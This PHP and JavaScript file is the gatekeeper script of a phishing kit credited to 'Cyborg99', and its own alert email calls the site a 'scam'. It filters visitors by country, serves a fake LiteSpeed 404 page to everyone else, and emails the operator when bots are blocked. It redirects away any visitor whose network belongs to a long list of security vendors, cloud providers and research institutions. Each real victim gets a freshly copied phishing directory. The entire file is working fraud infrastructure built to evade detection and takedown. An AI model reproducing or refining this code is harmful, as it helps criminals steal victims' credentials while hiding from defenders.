<?php @error_reporting(0);
// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
$rand = dechex(rand(0x000000, 0xFFFFFF));
// if you wan't to force HTTPS just remove the ( // ) bellow - *Your hosting must support Green SSL
//if(!isset($_SERVER["HTTPS"]) || $_SERVER["HTTPS"] != "on") { header("Location: https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"], true, 301); exit; }
#------------------------
#For Bot
$tanitatikaram = parse_ini_file("config.ini", true);
$nao=$tanitatikaram['namer'];
$nat=$tanitatikaram['naemv'];
$dirr=$tanitatikaram['dirnam'];
$repm=$tanitatikaram['reportmail'];
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
date_default_timezone_set('UTC');
$dota = str_replace(".", "", $IP);
$ch = $nao;
$spoti = $ch . '' . $dota;
$gr = $nat;
$spo = $gr . '' . $dota;
if(isset($_GET[$spoti])) 
{
$tanitatikaram = parse_ini_file("config.ini", true);
$repm=$tanitatikaram['reportmail'];
$MESSAGE="<p>ip  : $IP</p>";
$SUBJECT = "A BOT trying to access your scam and it was blocked successfully | $IP";
$HEADER = "MIME-Version: 1.0" . "\r\n";
$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$HEADER .= "From: BOTeye v1.9 <antibot@mail.com>\n";
mail($repm,$SUBJECT,$MESSAGE,$HEADER);
header("HTTP/1.0 304 Not Modified");
die();
}
if(isset($_GET[$spo])) 
{	
$randomString = substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 1) . substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 10);
#------------------------
##################################################################################################################
$tanitatikaram = parse_ini_file("config.ini", true);
$rlock=$tanitatikaram['countlock'];
$reg=$tanitatikaram['countreg'];
if ($rlock == '1'){
$rock = $reg;
$stone = strtoupper($rock);
function getLiIp() {
	    foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
	                $IPaddress = trim($IPaddress);
	                if (filter_var($IPaddress,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $IPaddress;
	                }
	            }
	        }
	    }
	}
$ip = getLiIp();

$url = "http://www.geoplugin.net/json.gp?ip=".$ip;
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp=curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$countrycode = $details['geoplugin_countryCode']; 	  
 
if(strpos($stone, $countrycode) !== false){
}else{
header("HTTP/1.0 404 Not Found");
echo '<!DOCTYPE html>';
echo '<html style="height:100%">';
echo '<head><meta charset="shift_jis"><title> 404 Not Found';
echo '</title></head>';
echo '<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">';
echo '<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">';
echo '<h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>';
echo '<h2 style="margin-top:20px;font-size: 30px;">Not Found';
echo '</h2>';
echo '<p>The resource requested could not be found on this server!</p>';
echo '</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">';
echo '<br>Proudly powered by  <a style="color:#fff;" href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a><p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>';
exit;
}

}

##################################################################################################################
$DIR=md5 (rand(0,80000));
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            }
            else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}
$home=$dirr;
recurse_copy( $home, $DIR );
$dota = str_replace(".", "", $IP);
header("location:$DIR/index.php?$spoti=$randomString");
#----------------------++
}
?>                        
<?php 
$rand = dechex(rand(0x000000, 0xFFFFFF)); 
$rand = sha1($rand);
?>

<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://ipapi.co/org/', true);
xhr.responseType = 'text';
xhr.onload = function () {
if (xhr.readyState === xhr.DONE) {
if (xhr.status === 200) {
var e<?php echo $rand; ?> = xhr.response;
if (
e<?php echo $rand; ?>.indexOf("LGBT") >= 0
|| e<?php echo $rand; ?>.indexOf("Amazon.com") >= 0
|| e<?php echo $rand; ?>.indexOf("Amazon") >= 0
|| e<?php echo $rand; ?>.indexOf("Chrome") >= 0
|| e<?php echo $rand; ?>.indexOf("Google") >= 0
|| e<?php echo $rand; ?>.indexOf("phish") >= 0
|| e<?php echo $rand; ?>.indexOf("Paypal") >= 0
|| e<?php echo $rand; ?>.indexOf("DedFiberCo") >= 0
|| e<?php echo $rand; ?>.indexOf("Palo Alto Networks") >= 0
|| e<?php echo $rand; ?>.indexOf("Digital Ocean") >= 0
|| e<?php echo $rand; ?>.indexOf("DigitalOcean") >= 0
|| e<?php echo $rand; ?>.indexOf("Google Cloud") >= 0
|| e<?php echo $rand; ?>.indexOf("Cloud") >= 0
|| e<?php echo $rand; ?>.indexOf("107.178.194.44") >= 0
|| e<?php echo $rand; ?>.indexOf("Trustwave Holdings") >= 0
|| e<?php echo $rand; ?>.indexOf("Holdings") >= 0
|| e<?php echo $rand; ?>.indexOf("Trustwave") >= 0
|| e<?php echo $rand; ?>.indexOf("SoftLayer Technologies") >= 0
|| e<?php echo $rand; ?>.indexOf("SoftLayer") >= 0
|| e<?php echo $rand; ?>.indexOf("SurfControl") >= 0
|| e<?php echo $rand; ?>.indexOf("EGIHosting") >= 0
|| e<?php echo $rand; ?>.indexOf("LogicWeb") >= 0
|| e<?php echo $rand; ?>.indexOf("Choopa") >= 0
|| e<?php echo $rand; ?>.indexOf("Shinjiru") >= 0
|| e<?php echo $rand; ?>.indexOf("LogicWeb") >= 0
|| e<?php echo $rand; ?>.indexOf("Total Server Solutions") >= 0
|| e<?php echo $rand; ?>.indexOf("Brookhaven National Laboratory") >= 0
|| e<?php echo $rand; ?>.indexOf("OVH Hosting") >= 0
|| e<?php echo $rand; ?>.indexOf("XFERA Moviles S.A.") >= 0
|| e<?php echo $rand; ?>.indexOf("AVAST") >= 0
|| e<?php echo $rand; ?>.indexOf("Privax Ltd.") >= 0
|| e<?php echo $rand; ?>.indexOf("Privax") >= 0
|| e<?php echo $rand; ?>.indexOf("M247 Europe SRL") >= 0
|| e<?php echo $rand; ?>.indexOf("Wintek Corporation") >= 0
|| e<?php echo $rand; ?>.indexOf("Amazon.com, Inc.") >= 0
|| e<?php echo $rand; ?>.indexOf("Kaspersky Lab AO") >= 0
|| e<?php echo $rand; ?>.indexOf("TELEFÔNICA BRASIL S.A") >= 0
|| e<?php echo $rand; ?>.indexOf("UK-2 Limited") >= 0
|| e<?php echo $rand; ?>.indexOf("Online S.a.s.") >= 0
|| e<?php echo $rand; ?>.indexOf("BullGuard ApS") >= 0
|| e<?php echo $rand; ?>.indexOf("net4sec UG") >= 0
|| e<?php echo $rand; ?>.indexOf("Datacamp Limited") >= 0
|| e<?php echo $rand; ?>.indexOf("HostDime.com, Inc.") >= 0
|| e<?php echo $rand; ?>.indexOf("Digital Energy Technologies Ltd.") >= 0
|| e<?php echo $rand; ?>.indexOf("New Dream Network, LLC") >= 0
|| e<?php echo $rand; ?>.indexOf("LeaseWeb Netherlands B.V.") >= 0
|| e<?php echo $rand; ?>.indexOf("Hetzner Online GmbH") >= 0
|| e<?php echo $rand; ?>.indexOf("Rakuten Communications Corp.") >= 0
|| e<?php echo $rand; ?>.indexOf("Forcepoint Cloud Ltd") >= 0
|| e<?php echo $rand; ?>.indexOf("IP Volume inc") >= 0
|| e<?php echo $rand; ?>.indexOf("NTT PC Communications, Inc.") >= 0
|| e<?php echo $rand; ?>.indexOf("Liberty Global B.V.") >= 0
|| e<?php echo $rand; ?>.indexOf("Google LLC") >= 0
|| e<?php echo $rand; ?>.indexOf("PALO ALTO NETWORKS") >= 0
|| e<?php echo $rand; ?>.indexOf("ColoCrossing") >= 0
|| e<?php echo $rand; ?>.indexOf("Forcepoint, LLC") >= 0
|| e<?php echo $rand; ?>.indexOf("SINET, Cambodia's specialist Internet and Telecom Service Provider.") >= 0
|| e<?php echo $rand; ?>.indexOf("DigitalOcean, LLC") >= 0
|| e<?php echo $rand; ?>.indexOf("Soyuz LTD") >= 0
|| e<?php echo $rand; ?>.indexOf("Internap Corporation") >= 0
|| e<?php echo $rand; ?>.indexOf("Nameshield SAS") >= 0
|| e<?php echo $rand; ?>.indexOf("Microsoft Corporation") >= 0
|| e<?php echo $rand; ?>.indexOf("VNPT Corp") >= 0
|| e<?php echo $rand; ?>.indexOf("PVimpelCom") >= 0
|| e<?php echo $rand; ?>.indexOf("net4sec UG") >= 0
|| e<?php echo $rand; ?>.indexOf("Wintek Corporation") >= 0
|| e<?php echo $rand; ?>.indexOf("EAGLE SKY CO LT") >= 0
|| e<?php echo $rand; ?>.indexOf("SoftLayer Technologies Inc.") >= 0
|| e<?php echo $rand; ?>.indexOf("Leaseweb USA, Inc.") >= 0
|| e<?php echo $rand; ?>.indexOf("HETZNER") >= 0
|| e<?php echo $rand; ?>.indexOf("F5 Networks, Inc.") >= 0
|| e<?php echo $rand; ?>.indexOf("British Telecommunications PLC") >= 0
|| e<?php echo $rand; ?>.indexOf("GigeNET") >= 0
|| e<?php echo $rand; ?>.indexOf("FASTER CZ spol. s r.o.") >= 0
|| e<?php echo $rand; ?>.indexOf("Cogent Communications") >= 0
|| e<?php echo $rand; ?>.indexOf("Renater") >= 0
|| e<?php echo $rand; ?>.indexOf("InterNetX GmbH") >= 0
|| e<?php echo $rand; ?>.indexOf("Forcepoint Cloud Ltd") >= 0
|| e<?php echo $rand; ?>.indexOf("The Corporation for Financing & Promoting Technology") >= 0
|| e<?php echo $rand; ?>.indexOf("PALO ALTO NETWORKS") >= 0
|| e<?php echo $rand; ?>.indexOf("TerraTransit AG") >= 0
|| e<?php echo $rand; ?>.indexOf("Joshua Peter McQuistan") >= 0
|| e<?php echo $rand; ?>.indexOf("Commtouch Inc.") >= 0
|| e<?php echo $rand; ?>.indexOf("YANDEX LLC") >= 0
|| e<?php echo $rand; ?>.indexOf("M247 Ltd") >= 0
|| e<?php echo $rand; ?>.indexOf("RateLimited") >= 0
|| e<?php echo $rand; ?>.indexOf("Hot-Net internet services Ltd.") >= 0
|| e<?php echo $rand; ?>.indexOf("NTT Communications Corporation") >= 0
|| e<?php echo $rand; ?>.indexOf("Hetzner Online GmbH") >= 0
|| e<?php echo $rand; ?>.indexOf("Sungard Availability Network Solutions") >= 0
|| e<?php echo $rand; ?>.indexOf("Network Solutions") >= 0
|| e<?php echo $rand; ?>.indexOf("McAfee") >= 0
|| e<?php echo $rand; ?>.indexOf("Google Proxy") >= 0
|| e<?php echo $rand; ?>.indexOf("Contina Communications, LLC") >= 0
|| e<?php echo $rand; ?>.indexOf("77") >= 0
|| e<?php echo $rand; ?>.indexOf("Almouroltec Servicos De Informatica E Internet Lda") >= 0
|| e<?php echo $rand; ?>.indexOf("HL komm Telekommunikations GmbH") >= 0
|| e<?php echo $rand; ?>.indexOf("Symantec Corporation") >= 0
|| e<?php echo $rand; ?>.indexOf("KVCHOSTING.COM LLC") >= 0
|| e<?php echo $rand; ?>.indexOf("Tiscali SpA") >= 0
|| e<?php echo $rand; ?>.indexOf("Vertical Telecoms Pty Ltd") >= 0
|| e<?php echo $rand; ?>.indexOf("1&1 Internet SE") >= 0
|| e<?php echo $rand; ?>.indexOf("AVAST Software s.r.o.") >= 0
|| e<?php echo $rand; ?>.indexOf("Microsoft Corporation") >= 0
|| e<?php echo $rand; ?>.indexOf("Total Server Solutions L.L.C") >= 0
|| e<?php echo $rand; ?>.indexOf("EVANZO e-commerce GmbH") >= 0
|| e<?php echo $rand; ?>.indexOf("TM Net, Internet Service Provider") >= 0
|| e<?php echo $rand; ?>.indexOf("ESET, spol. s r.o.") >= 0
|| e<?php echo $rand; ?>.indexOf("Atlantic.net, Inc.") >= 0
|| e<?php echo $rand; ?>.indexOf("Venus Business Communications Limited") >= 0
|| e<?php echo $rand; ?>.indexOf("OVH SAS") >= 0
){
window.location.href = "";
}else {
window.location.href = "session.php?<?php echo $spo;?>=<?php echo $spo;?>-<?php echo $rand;?>";
}
        }
    }
};

xhr.send(null);



</script>                                